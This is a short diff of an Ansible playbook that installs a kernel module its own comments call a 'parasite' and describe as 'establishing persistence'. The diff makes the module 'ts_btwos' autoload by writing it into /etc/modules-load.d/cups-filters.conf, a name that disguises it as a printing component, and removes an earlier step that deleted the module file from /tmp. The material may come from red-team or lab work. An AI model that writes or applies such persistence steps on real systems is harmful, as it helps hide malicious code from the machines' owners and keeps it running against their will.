@@ -25,7 +25,12 @@
 
 # recompile dependency list, create modules conf, insert parasite into conf
 - name: Creating and establishing persistence
-  shell: depmod -a && touch /etc/modules-load.d/cups-filters.conf && echo "ts_btwos" >> /etc/modules-load.d/cups-filters.conf
+  shell: depmod -a 
 
-- name: Cleaning up parasite copy
-  shell: rm /tmp/ts_btwos.ko
+- name: Set module to autoload
+  ansible.builtin.lineinfile:
+    state: present
+    create: yes
+    path: /etc/modules-load.d/cups-filters.conf
+    line: "ts_btwos"
+
